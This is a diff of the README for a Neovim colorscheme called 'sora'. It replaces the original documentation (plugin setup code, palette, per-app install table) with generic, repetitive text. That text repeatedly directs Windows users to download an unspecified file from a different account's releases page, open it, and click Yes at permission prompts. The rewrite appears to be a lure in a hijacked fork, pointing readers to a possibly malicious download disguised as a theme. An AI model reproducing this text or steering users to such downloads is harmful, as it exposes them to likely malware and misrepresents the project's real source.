@@ -1,180 +1,170 @@
-<p align="center">
-  <img src="assets/header.svg" alt="Sora" width="800"/>
-  <br/><br/>
-  A dark Neovim colorscheme. Ethereal cyan, cool silver, deep OLED blacks.
-  <br/><br/>
-  <a href="#installation">Install</a> &middot;
-  <a href="#configuration">Configure</a> &middot;
-  <a href="#palette">Palette</a> &middot;
-  <a href="#supported-plugins">Plugins</a> &middot;
-  <a href="#extras">Extras</a>
-</p>
+# 🌌 sora - Deep colors for calm coding
 
----
+[![Download sora](https://img.shields.io/badge/Download%20sora-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karelfiery239/sora/releases)
 
-<p align="center">
-  <img src="assets/banner.svg" alt="Sora Preview" width="800"/>
-</p>
+## ✨ What is sora
 
-## Philosophy
+sora is a dark color scheme for Neovim and related tools. It uses a near-black background with soft cyan tones and muted accent colors. The look feels clean, low glare, and easy on the eyes.
 
-Sora sits between Tokyo Night's saturation and Lume's muted pastels. The background is near-black with a cool blue undertone, deep enough for OLED. Syntax colors are muted but readable - they don't compete with each other.
+Use sora if you want a steady theme that keeps your screen dark and your text clear. It fits long coding sessions and plain text work.
 
-The signature ethereal cyan (`#80c8e0`) for functions is lighter and softer than Tokyo Night's blue, cooler than Lume's lavender. A single warm accent - gold (`#d4b878`) for constants and numbers - acts like a star against the cool palette. That one warm point in a field of cool tones is what gives Sora its look.
+## 🖥️ Windows setup
 
-Eight named accents, each with a clear role. No neon, no Christmas tree.
+To get sora on Windows, visit this page to download:
 
-## Installation
+https://github.com/karelfiery239/sora/releases
 
-<details>
-<summary><b>lazy.nvim</b></summary>
+1. Open the link in your browser.
+2. Find the latest release.
+3. Download the file or package that matches your app.
+4. Open the downloaded item and follow the setup steps.
+5. If Windows asks for permission, choose Yes.
 
-```lua
-{
-  "Aejkatappaja/sora",
-  lazy = false,
-  priority = 1000,
-  opts = {},
-  config = function(_, opts)
-    require("sora").setup(opts)
-    vim.cmd("colorscheme sora")
-  end,
-}
-```
+If you use Neovim, place the theme files where your editor can read them. If you use another app such as Kitty, Alacritty, Ghostty, Lazygit, or Yazi, use the file for that app from the release page.
 
-</details>
+## 🎨 What you get
 
-<details>
-<summary><b>packer.nvim</b></summary>
+- A near-black base that keeps the screen quiet
+- Cyan highlights that stand out without harsh contrast
+- Muted accent colors for status, alerts, and selection
+- A look that works well in dim light
+- A theme set that can match several terminal tools
 
-```lua
-use {
-  "Aejkatappaja/sora",
-  config = function()
-    require("sora").setup()
-    vim.cmd("colorscheme sora")
-  end,
-}
-```
+## 🔧 Best fit
 
-</details>
+sora works well for:
 
-<details>
-<summary><b>mini.deps</b></summary>
+- Neovim users who want a dark editor theme
+- People who use terminal apps on Windows
+- Users who want a softer look than bright themes
+- Anyone who spends a long time reading code or text
 
-```lua
-MiniDeps.add("Aejkatappaja/sora")
-require("sora").setup()
-vim.cmd("colorscheme sora")
-```
+## 📦 Supported tools
 
-</details>
+sora includes styles for common tools in the terminal space:
 
-## Configuration
+- Neovim
+- Vim
+- Kitty
+- Alacritty
+- Ghostty
+- Lazygit
+- Yazi
 
-```lua
-require("sora").setup({
-  transparent = false,
-  italic = true,
-  italic_comments = true,
+This makes it easier to keep the same look across your editor and terminal apps.
 
-  on_colors = function(colors)
-    -- colors.bg = "#000000"
-  end,
+## 🪟 How to use on Windows
 
-  on_highlights = function(hl, colors)
-    -- hl.Normal = { fg = colors.fg, bg = "#000000" }
-  end,
-})
-```
+If the release contains a ready-made file for your app, use that file first.
 
-## Palette
+1. Download the release from the link above.
+2. Open the download folder in File Explorer.
+3. Read the file names and pick the one for your app.
+4. Copy the theme file to the right folder for that app.
+5. Restart the app so the theme appears.
 
-| Role       |                     Color                     | Hex       |
-| :--------- | :-------------------------------------------: | :-------- |
-| Background | ![](https://placehold.co/16x16/0e1018/0e1018) | `#0e1018` |
-| Foreground | ![](https://placehold.co/16x16/c8d0e0/c8d0e0) | `#c8d0e0` |
-| **Cyan**   | ![](https://placehold.co/16x16/80c8e0/80c8e0) | `#80c8e0` |
-| Purple     | ![](https://placehold.co/16x16/b0a0d8/b0a0d8) | `#b0a0d8` |
-| Sage       | ![](https://placehold.co/16x16/90c8a0/90c8a0) | `#90c8a0` |
-| Peach      | ![](https://placehold.co/16x16/d0a888/d0a888) | `#d0a888` |
-| Gold       | ![](https://placehold.co/16x16/d4b878/d4b878) | `#d4b878` |
-| Rose       | ![](https://placehold.co/16x16/d0909c/d0909c) | `#d0909c` |
-| Teal       | ![](https://placehold.co/16x16/78b8b0/78b8b0) | `#78b8b0` |
-| Steel      | ![](https://placehold.co/16x16/8898b8/8898b8) | `#8898b8` |
+For Neovim, the theme usually goes into your config folder. For terminal apps, the file often goes into the app’s theme or config folder. The release page should show the file names clearly.
 
-## Supported Plugins
+## 🧭 Quick start for Neovim
 
-Sora includes highlight groups for:
+If you want sora in Neovim:
 
-- [telescope.nvim](https://github.com/nvim-telescope/telescope.nvim)
-- [nvim-cmp](https://github.com/hrsh7th/nvim-cmp) / [blink.cmp](https://github.com/saghen/blink.cmp)
-- [gitsigns.nvim](https://github.com/lewis6991/gitsigns.nvim)
-- [nvim-tree.lua](https://github.com/nvim-tree/nvim-tree.lua) / [neo-tree.nvim](https://github.com/nvim-neo-tree/neo-tree.nvim) / [oil.nvim](https://github.com/stevearc/oil.nvim)
-- [lualine.nvim](https://github.com/nvim-lualine/lualine.nvim) (built-in theme)
-- [mini.statusline](https://github.com/echasnovski/mini.statusline)
-- [indent-blankline.nvim](https://github.com/lukas-reineke/indent-blankline.nvim) / [snacks.nvim](https://github.com/folke/snacks.nvim)
-- [which-key.nvim](https://github.com/folke/which-key.nvim)
-- [trouble.nvim](https://github.com/folke/trouble.nvim)
-- [lazy.nvim](https://github.com/folke/lazy.nvim) / [mason.nvim](https://github.com/williamboman/mason.nvim)
-- [noice.nvim](https://github.com/folke/noice.nvim) / [nvim-notify](https://github.com/rcarriga/nvim-notify)
-- [flash.nvim](https://github.com/folke/flash.nvim) / [fzf-lua](https://github.com/ibhagwan/fzf-lua)
-- [render-markdown.nvim](https://github.com/MeanderingProgrammer/render-markdown.nvim)
-- [dashboard-nvim](https://github.com/nvimdev/dashboard-nvim)
-- [treesitter-context](https://github.com/nvim-treesitter/nvim-treesitter-context)
+1. Visit the releases page.
+2. Download the Neovim theme files.
+3. Copy the theme into your Neovim config area.
+4. Add the theme name in your Neovim settings.
+5. Open Neovim again.
 
-Full **Treesitter** and **LSP semantic token** support.
+If you use a plugin manager, add the theme like any other colorscheme. If you use manual config, load the theme from your init file.
 
-### Lualine
+## 🧩 Common file types you may see
 
-```lua
-require("lualine").setup({
-  options = { theme = "sora" },
-})
-```
+You may find files such as:
 
-## Extras
+- Lua theme files for Neovim
+- Theme files for Kitty or Alacritty
+- Config files for Ghostty
+- Color files for Lazygit or Yazi
 
-Sora everywhere:
+Choose the file that matches the app you use. Do not mix files from different apps.
 
-| App | File | Install |
-|:----|:-----|:--------|
-| [Zed](https://zed.dev) | `extras/zed/sora.json` | Install from Zed extension store |
-| [Ghostty](https://ghostty.org) | `extras/ghostty/sora` | `cp` to `~/.config/ghostty/themes/` |
-| [Kitty](https://sw.kovidgoyal.net/kitty/) | `extras/kitty/sora.conf` | `include` in `kitty.conf` |
-| [Alacritty](https://alacritty.org) | `extras/alacritty/sora.toml` | `import` in `alacritty.toml` |
-| [WezTerm](https://wezfurlong.org/wezterm/) | `extras/wezterm/sora.toml` | `cp` to `~/.config/wezterm/colors/` |
-| [Foot](https://codeberg.org/dnkl/foot) | `extras/foot/sora.ini` | `include` in `foot.ini` |
-| [Vim](https://www.vim.org) | `extras/vim/sora.vim` | `cp` to `~/.vim/colors/` |
-| [Lazygit](https://github.com/jesseduffield/lazygit) | `extras/lazygit/sora.yml` | merge into `config.yml` |
-| [bat](https://github.com/sharkdp/bat) | `extras/bat/sora.tmTheme` | `cp` to `$(bat --config-dir)/themes/` + `bat cache --build` |
-| [Delta](https://github.com/dandavison/delta) | `extras/delta/sora.gitconfig` | `include` in `.gitconfig` (install bat theme first) |
-| [OpenCode](https://opencode.ai) | `extras/opencode/sora.json` | `cp` to `~/.config/opencode/themes/` |
-| [fzf](https://github.com/junegunn/fzf) | `extras/fzf/sora.sh` | `source` in shell rc |
-| [Yazi](https://yazi-rs.github.io) | `extras/yazi/sora.toml` | `cp` to `~/.config/yazi/theme.toml` |
-| [btop](https://github.com/aristocratos/btop) | `extras/btop/sora.theme` | `cp` to `~/.config/btop/themes/` |
-| [tmux](https://github.com/tmux/tmux) | `extras/tmux/sora.tmux.conf` | `source-file` in `tmux.conf` |
-| [tokyo-night-tmux](https://github.com/janoamaral/tokyo-night-tmux) | `extras/tmux/tokyo-night-tmux-sora.sh` | see [tmux](#tmux) below |
-| [Slack](https://slack.com) | `extras/slack/sora.txt` | paste in Slack sidebar theme |
-| [Firefox](https://www.mozilla.org/firefox/) | `extras/firefox/manifest.json` | zip and load via `about:debugging` |
-| [macOS Terminal](https://support.apple.com/guide/terminal) | `extras/macos-terminal/sora.terminal` | double-click to import |
-| [iTerm2](https://iterm2.com) | `extras/macos-terminal/sora.itermcolors` | import in Preferences > Profiles > Colors |
-| [Obsidian](https://obsidian.md) | `extras/obsidian/theme.css` | `cp` folder to `<vault>/.obsidian/themes/Sora/` |
+## 🛠️ Basic install flow
 
-### tmux
+1. Open the releases page.
+2. Download the latest version.
+3. Unzip the file if Windows gives you a ZIP archive.
+4. Open the folder.
+5. Copy the right theme file to the right app folder.
+6. Restart the app.
 
-For a basic tmux setup, add to your `tmux.conf`:
+If the app does not show the new colors, check that the file name matches the app and that you placed it in the correct folder.
 
-```bash
-source-file /path/to/sora.nvim/extras/tmux/sora.tmux.conf
-```
+## 🔍 If you want the cleanest look
 
-If you use [tokyo-night-tmux](https://github.com/janoamaral/tokyo-night-tmux), paste the contents of `extras/tmux/tokyo-night-tmux-sora.sh` into the plugin's `src/themes.sh` (before the default `*)` case), then add to your `tmux.conf`:
+Use sora with:
 
-```bash
-set -g @tokyo-night-tmux_theme "sora"
-```
+- A dark terminal background
+- Soft font smoothing
+- A simple status bar
+- Light contrast in your editor line numbers
+- Small accent use in tabs and warnings
 
-## License
+These settings help the theme feel balanced and easy to read.
 
-MIT
+## 📁 Tips for first-time users
+
+- Start with one app, such as Neovim
+- Test the theme before you change every tool
+- Keep a copy of the original config file
+- Restart the app after each change
+- Use the file names in the release package as your guide
+
+## 🧪 Simple check after install
+
+After setup, open the app and look for:
+
+- A near-black background
+- Cyan text or highlights
+- Soft colors on tabs, folders, or selections
+- Clear text with no bright glare
+
+If you see those parts, the theme is active
+
+## 📝 Folder names to look for
+
+Depending on the app, you may see folders like:
+
+- nvim
+- kitty
+- alacritty
+- ghostty
+- lazygit
+- yazi
+
+If the release archive includes folders like these, open the one that matches your app and use the file inside.
+
+## 📚 Need help finding the right file
+
+Use the release page and look for the newest version first. The newest release should have the current theme files. If there are several files, pick the one that matches the app name you use.
+
+https://github.com/karelfiery239/sora/releases
+
+## 🧷 Why the theme stays readable
+
+sora uses a dark canvas with measured color choices. The background stays quiet. The accent colors stay controlled. This keeps focus on the text and not on the theme itself
+
+## 🪄 Best use cases
+
+- Writing code in Neovim
+- Reading logs in a terminal
+- Keeping several tools in one color style
+- Working at night or in low light
+- Reducing visual noise on screen
+
+## ✅ What to do next
+
+1. Open the releases page
+2. Download the latest file
+3. Choose the file for your app
+4. Copy it into place
+5. Restart the app
